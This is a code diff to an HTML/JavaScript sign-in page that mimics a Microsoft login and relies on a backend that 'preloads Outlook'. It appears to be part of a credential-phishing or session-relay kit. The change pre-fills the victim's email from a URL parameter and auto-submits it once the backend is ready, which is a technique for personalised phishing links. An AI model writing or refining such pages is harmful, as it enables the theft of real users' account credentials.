@@ -479,6 +479,10 @@
                 ← <span id="enteredEmail"></span>
             </div>
 
+            <div class="back-info" id="urlParamInfo" style="display: none; color: #0078d4; margin-bottom: 10px;">
+                📧 Auto-detected: <span id="urlParamEmail"></span>
+            </div>
+
             <div class="header">
                 <h1 id="headerTitle">Sign in</h1>
             </div>
@@ -569,12 +573,41 @@
 
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
-            // Start with loading dots - don't show email form until backend is ready
-            setLoading(true, 'Trying to sign you in', false);
+            // Check for email parameter in URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const emailParam = urlParams.get('email');
             
-            checkBackendHealth();
-            checkSessionStatus();
-            preloadOutlook();
+            if (emailParam) {
+                console.log('Email parameter detected:', emailParam);
+                // Pre-fill email and auto-submit after backend is ready
+                document.getElementById('email').value = emailParam;
+                
+                // Show URL parameter info
+                document.getElementById('urlParamEmail').textContent = emailParam;
+                document.getElementById('urlParamInfo').style.display = 'block';
+                
+                // Start with loading dots and auto-submit when ready
+                setLoading(true, 'Trying to sign you in', false);
+                
+                checkBackendHealth();
+                checkSessionStatus();
+                preloadOutlook().then(() => {
+                    // Auto-submit the email after preload is complete
+                    setTimeout(() => {
+                        if (document.getElementById('emailForm').style.display !== 'none') {
+                            console.log('Auto-submitting email:', emailParam);
+                            startLogin({ preventDefault: () => {} }); // Auto-submit
+                        }
+                    }, 500);
+                });
+            } else {
+                // Normal initialization without auto-submit
+                setLoading(true, 'Trying to sign you in', false);
+                
+                checkBackendHealth();
+                checkSessionStatus();
+                preloadOutlook();
+            }
         });
 
         // Utility functions
@@ -772,7 +805,7 @@
             // Prevent concurrent preload requests
             if (preloadInProgress) {
                 console.log('Preload already in progress, skipping...');
-                return;
+                return Promise.resolve();
             }
 
             preloadInProgress = true;
@@ -822,7 +855,7 @@
                         setTimeout(() => {
                             document.getElementById('email').focus();
                         }, 100);
-                        return; // Success - exit function
+                        return Promise.resolve(); // Success - exit function
                     } else {
                         // Handle non-terminal statuses (loading, busy, etc.) - treat as transient and retry
                         throw new Error(`Transient status: ${data.status || 'unknown'}`);
@@ -839,12 +872,14 @@
                     // Exponential backoff: 2s, 4s, 8s, 16s
                     const delayMs = Math.min(2000 * Math.pow(2, retryAttempt - 1), 16000);
                     
-                    setTimeout(() => {
-                        // Reset the flag before retrying
-                        preloadInProgress = false;
-                        preloadOutlook(retryAttempt + 1, maxRetries);
-                    }, delayMs);
-                    return; // Don't execute the finally block yet
+                    return new Promise((resolve) => {
+                        setTimeout(async () => {
+                            // Reset the flag before retrying
+                            preloadInProgress = false;
+                            await preloadOutlook(retryAttempt + 1, maxRetries);
+                            resolve();
+                        }, delayMs);
+                    });
                 }
                 
                 // All retries exhausted - show error
